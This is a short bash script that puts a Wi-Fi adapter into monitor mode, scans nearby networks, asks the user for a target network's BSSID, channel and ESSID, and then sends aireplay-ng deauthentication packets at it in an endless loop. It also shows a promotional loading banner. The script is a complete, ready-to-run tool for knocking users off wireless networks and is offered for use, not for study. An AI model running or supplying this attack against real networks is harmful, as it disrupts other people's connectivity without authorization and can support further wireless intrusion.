#!/bin/bash

# Function to display available Wi-Fi adapters
display_adapters() {
    echo "Available Wi-Fi adapters:"
    iw dev | grep Interface | awk '{print $2}'
}

# Function to put the Wi-Fi adapter in monitor mode
enable_monitor_mode() {
    local adapter=$1
    sudo ip link set $adapter down
    sudo iw dev $adapter set type monitor
    sudo ip link set $adapter up
    sudo iw dev $adapter info | grep type
    echo "$adapter is now in monitor mode."
}

# Function to scan for available Wi-Fi networks
scan_networks() {
    local adapter=$1
    sudo iwlist $adapter scanning | grep 'ESSID\|Address' | awk '/Address/ {printf "BSSID: "$5} /ESSID/ {print " ESSID: "$1}' | sed 's/ESSID://g;s/"//g'
}

# Function to send deauthentication packets
send_deauth_packets() {
    local adapter=$1
    local bssid=$2
    local channel=$3
    local essid=$4
    sudo iw dev $adapter set channel $channel
    echo "Sending deauthentication packets... (Press Ctrl+C to stop)"
    while true; do
        sudo aireplay-ng --deauth 1000 -a $bssid -e "$essid" --ignore-negative-one $adapter
        sleep 0.1
    done
}

# Function to display the loading message
display_loading() {
    local duration=$1
    local message=$2
    local end_time=$((SECONDS + duration))
    while [ $SECONDS -lt $end_time ]; do
        echo -ne "$message\r"
        sleep 1
    done
}

# Main script
clear

# Display loading message
display_loading 10 "Loading... Visit: https://amzonattorney.site/ - By SYED HASSAN BACHA"

clear
display_adapters

echo "Enter the name of the Wi-Fi adapter you want to use:"
read adapter

echo "Do you want to put the Wi-Fi adapter in monitor mode? (Y/N)"
read monitor_mode

if [ "$monitor_mode" == "Y" ] || [ "$monitor_mode" == "y" ]; then
    enable_monitor_mode $adapter
    echo "Verify the adapter is in monitor mode above."
    echo "Press Enter to continue."
    read
fi

echo "Scanning for available Wi-Fi networks..."
scan_networks $adapter

echo "Enter the BSSID of the Wi-Fi network you want to target:"
read bssid

echo "Enter the channel of the Wi-Fi network you want to target:"
read channel

echo "Enter the ESSID of the Wi-Fi network you want to target:"
read essid

echo "Starting deauthentication attack on $bssid at channel $channel with ESSID $essid..."
send_deauth_packets $adapter $bssid $channel "$essid"

